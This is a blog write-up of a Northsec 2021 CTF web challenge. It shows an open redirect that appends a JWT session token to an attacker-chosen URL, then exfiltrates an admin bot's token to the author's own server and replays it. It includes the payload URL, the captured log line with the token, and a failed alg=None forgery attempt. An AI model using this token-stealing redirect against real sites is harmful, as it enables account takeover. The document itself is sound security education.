---
layout: post
title: Northsec 2021 Writeup - Wizard Hackademy - Open Redirect
date: 2021-05-24
type: post
tags:
- Writeup
- Hacking
- Northsec
- CTF
permalink: /2021/05/Northsec2021WriteupOpenRedirect/
---

In this challenge, we have a web site on `http://chal5.wizard-hackademy.ctf/` with two links and a message that tells us we are logged in as an apprentice. 

![Main Page](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/MainPage.png "Main Page").


When I clicked on the first link, I was sent to a page on a sub domain `http://sub.chal5.wizard-hackademy.ctf/`. 

![Sub Domain Page](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/SubPage.png "Sub Domain Page").

The page contains a link back to the main page and inform us that we are still logged in as an apprentice. 

I then tried the link to speak to a Grand Master Wizard. This page allow us to provide a URL and the wizard will load it.

![Wizard Page](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/WizardPage.png "Wizard Page").

The CTF provided us with a box we could use inside the network. I tried sending the wizard to a site on that page so I could see what would appear in the logs. 

![Visit Shell Page](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/VisitShellPage.png "Visit Shell Page").

The wizard went to the page, but nothing interesting was leaked in the logs.

## Exploiting The Redirection

I looked back at the requests in Burp and I saw that when you're on the main page and click on the link to the sub site, it first load `http://chal5.wizard-hackademy.ctf/?sub_url=http://sub.chal5.wizard-hackademy.ctf/`. This then add a token to the sub_url before redirecting you there. So the sub site URL becomes: `http://sub.chal5.wizard-hackademy.ctf/?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUud2l6YXJkLWhhY2thZGVteS5jdGZcLyIsImlhdCI6MTYyMTY1Mjk2MiwibmJmIjoxNjIxNjUyOTYyLCJleHAiOjE2MjE2NTMyNjIsInVzZXIiOiJhcHByZW50aWNlIiwicm9sZSI6ImFwcHJlbnRpY2UifQ.bDEamErj1LWl7kR2DrE4D3UG49zPa8OQt8YYfeJiZrY`

This looks like a JWT token. I base64 decoded it and this I what I got:
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
.
{
  "iss": "http:\\/\\/sub.chal5.wizard-hackademy.ctf\\/",
  "iat": 1621652962,
  "nbf": 1621652962,
  "exp": 1621653262,
  "user": "apprentice",
  "role": "apprentice"
}
.
Ã.©.®=KZ^äG`ë..÷Pn=Ìö¼9.|a.Þ&&kd
```

I tried changing the algorithm to None and resubmit the token without the signature, but that didn't work. 

Then I decided to use this sub_url feature in the wizard page. If the wizard was to follow a link to the main page with a sub_url that pointed to our server, the token might be appended to our server's URL and it would show in the logs. 

I went back to the wizard page and entered this URL `http://chal5.wizard-hackademy.ctf/?sub_url=http://shell.ctf/`. 

![Send the Wizard to Our Site](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/SendWizardToOurSite.png "Send the Wizard to Our Site").

I looked at the Apache logs on our server, and I saw that the Wizard had hit the page and their token was in the logs. 

```
9000:470:b2b5:cafe:216:3eff:fe33:a18e - - [22/May/2021:03:12:35 +0000] "GET //?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUud2l6YXJkLWhhY2thZGVteS5jdGZcLyIsImlhdCI6MTYyMTY1MzE1NCwibmJmIjoxNjIxNjUzMTU0LCJleHAiOjE2MjE2NTM0NTQsInVzZXIiOiJVbmZvcnR1bmF0ZSB3aXphcmQiLCJyb2xlIjoiR3JhbmQgTWFzdGVyIFdpemFyZCJ9.fnBNbxNh3n5eFAZNg3YGd7dSx7-avhPH5Ovm2H_u7LQ HTTP/1.1" 200 11173 "-" "-"
```

I then visited the site on the sub domain using that token. And I was then connected as the Wizard. 

`http://sub.chal5.wizard-hackademy.ctf/?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUud2l6YXJkLWhhY2thZGVteS5jdGZcLyIsImlhdCI6MTYyMTY1MzE1NCwibmJmIjoxNjIxNjUzMTU0LCJleHAiOjE2MjE2NTM0NTQsInVzZXIiOiJVbmZvcnR1bmF0ZSB3aXphcmQiLCJyb2xlIjoiR3JhbmQgTWFzdGVyIFdpemFyZCJ9.fnBNbxNh3n5eFAZNg3YGd7dSx7-avhPH5Ovm2H_u7LQ`


![I Am the Wizard](/assets/images/2021/05/Northsec/WizardHackademy/OpenRedirect/ImAWizard.png "I Am the Wizard").

From there, I clicked on the link to go back to the main site, and the flag was displayed.

Flag: FLAG-4c312b96d8cb77d3ef0e0cb19b10dd6f

